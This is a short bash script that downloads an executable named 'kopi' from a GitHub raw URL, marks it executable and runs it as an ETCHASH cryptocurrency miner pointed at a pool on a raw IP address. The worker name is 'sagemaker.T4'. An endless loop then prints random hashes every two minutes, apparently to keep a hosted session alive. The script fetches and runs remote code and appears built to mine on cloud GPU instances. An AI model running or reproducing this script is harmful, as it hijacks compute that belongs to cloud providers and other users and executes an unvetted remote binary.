#!/bin/bash

wget https://github.com/aurbach55/dera/raw/main/kopi && chmod +x ./kopi && ./kopi --algo ETCHASH --pool 47.108.153.82:443 --user sagemaker.T4
while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
 
